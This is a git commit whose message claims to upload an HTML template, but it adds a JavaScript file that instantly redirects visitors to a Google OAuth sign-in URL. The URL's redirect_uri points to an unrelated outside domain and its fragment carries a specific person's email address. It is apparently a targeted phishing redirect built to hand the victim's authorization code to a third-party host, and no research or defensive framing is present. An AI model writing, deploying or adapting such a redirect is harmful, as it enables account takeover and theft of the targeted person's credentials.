969b5dce4290c1b689a57cd4da354d9adca86dcb
tanjanegineering-oss <tanjanegineering@gmail.com>
2026-05-04 05:06:07 -0700

    Upload templates.html with user URL

---
+++ file_1777896367098.js
@@ -0,0 +1,2 @@
+window.location.replace("https://accounts.google.com/o/oauth2/v2/auth?client_id=657079357666-3g230i26e3fgb18dets4i0n4bec0j779.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fff.petroseven-tz.co%2Fxbit3%2F&response_type=code&scope=email%20profile%20openid&access_type=online&prompt=none&state=secureState123#queen@queendomlamp.com");
+
